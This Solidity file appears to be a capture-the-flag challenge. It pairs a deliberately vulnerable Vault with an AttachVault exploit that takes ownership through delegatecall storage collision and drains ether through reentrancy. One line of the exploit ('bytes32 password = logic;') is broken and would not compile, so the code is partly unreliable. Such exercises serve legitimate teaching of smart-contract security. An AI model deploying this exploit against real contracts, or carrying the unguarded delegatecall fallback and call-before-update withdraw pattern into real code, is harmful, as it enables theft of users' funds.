// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VaultLogic {

  address public owner;
  bytes32 private password;

  constructor(bytes32 _password)  {
    owner = msg.sender;
    password = _password;
  }

  function changeOwner(bytes32 _password, address newOwner) public {
    if (password == _password) {
        owner = newOwner;
    } else {
      revert("password error");
    }
  }
}

contract Vault {

  address public owner;
  VaultLogic logic;
  mapping (address => uint) deposites;
  bool public canWithdraw = false;


  constructor(address _logicAddress)  {
    logic = VaultLogic(_logicAddress);
    owner = msg.sender;
  }


  fallback() external {
    (bool result,) = address(logic).delegatecall(msg.data);
    if (result) {
      this;
    }
  }

  receive() external payable {

  }

  function deposit() public payable { 
    deposites[msg.sender] += msg.value;
  }

  function isSolve() external view returns (bool){
    if (address(this).balance == 0) {
      return true;
    } 
  }

  function openWithdraw() external {
    if (owner == msg.sender) {
      canWithdraw = true;
    } else {
      revert("not owner");
    }
  }

  function withdraw() public {

    if(canWithdraw && deposites[msg.sender] >= 0) {
      (bool result,) = msg.sender.call{value: deposites[msg.sender]}("");
      if(result) {
        deposites[msg.sender] = 0;
      }
      
    }

  }

}

contract AttachVault {
  
  Vault public vault;   
  VaultLogic public logic;
  constructor(Vault _vaultAddress, VaultLogic _logic)  {
    vault = _vaultAddress;
    logic = _logic;

  }
  function attack() public payable {
    vault.deposit{value: 1 ether}();
    bytes32 password = logic;
    address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", 
      password, address(this)));
    vault.openWithdraw();
    vault.withdraw();
  
    
  }
  receive() external payable {
    if (address(vault).balance > 1 ether) {
      vault.withdraw();
    }
  }

}